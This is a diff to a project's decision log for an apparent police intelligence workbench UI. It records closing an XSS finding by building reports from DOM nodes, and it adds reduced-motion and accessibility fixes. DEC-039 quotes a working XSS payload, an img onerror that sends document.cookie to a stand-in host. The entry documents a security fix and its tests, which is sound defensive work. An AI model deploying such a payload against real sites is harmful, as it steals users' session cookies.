@@ -487,3 +487,47 @@ cannot contain the hash of a transaction that commits to that record.
 Exports additionally publish `sealed_root`, `sealed_root_matches_current` and
 `records_added_after_seal`. Appending after a seal is legitimate; publishing the drifted root as if it
 were anchored is not. Two regression tests cover both.
+
+---
+
+## Phase 9 — Workbench UI
+
+### DEC-039 — FINDING-02 closed: reports are built from DOM nodes, not HTML strings.
+Carried since the Phase 1 audit. Both v1 print paths template-interpolated **analyst-authored** fields
+into HTML and passed the result to `document.write()`. Confirmed exploitable before rewriting — a case
+titled
+
+    <img src=x onerror="fetch('https://evil.test/'+document.cookie)">
+
+produces a live `onerror` handler executing on the **same origin as the officer's session**, in a tool
+whose whole purpose is handling hostile input copied from criminal marketplaces. The second site
+(`AlertLog.tsx:62`) was never named in the playbook and was found by the Phase 1 audit.
+
+Fixed by escape-**by-construction**, not by escaping: `lib/report.ts` builds the report with
+`createElement` + `textContent`, which cannot produce markup regardless of input. There is no escaping
+helper for a future call site to forget. `document.write` is gone from the codebase, and the generated
+document contains no inline `<script>` either, so a strict CSP cannot be bypassed through this path.
+
+Regression-locked by 13 tests including five real XSS payloads, plus static assertions that no source
+file calls `document.write(` or assigns `innerHTML`.
+
+### DEC-040 — FINDING-05 closed: motion is gated, but information is not.
+v1 had zero `prefers-reduced-motion` handling while running three indefinite animations (scanline,
+geofence pulse, siren expansion) in a tool an officer watches for a full shift.
+
+The gate reduces motion **without reducing information**, which is the part worth getting right: the
+scanline is pure decoration and is removed, but a siren freezes at **full extent** rather than at
+whatever frame it stopped on, so a breach is still unmistakably visible. A reduced-motion user must not
+receive less evidence than anyone else.
+
+### DEC-041 — Focus trap, dialog roles, and an assertive live region for breaches.
+v1 had no focus trap, no Escape handling, no `role="dialog"` and no `aria-live` anywhere. A keyboard
+user could Tab out of an open modal into the page behind it; a screen-reader user was never told a
+dialog had opened, and **never heard that a geofence breach had fired**.
+
+`lib/a11y.ts` traps Tab in both directions, handles Escape, and restores focus to the element that
+opened the dialog. Wired into `IntelDetailModal` and the notification drawer.
+
+`BreachToaster` now renders a visually-hidden `aria-live="assertive"` region alongside the toast.
+Sonner toasts are routinely missed by screen readers, and a geofence breach is the single most
+important event this product produces — announcing it is not an accessibility nicety, it is the feature.
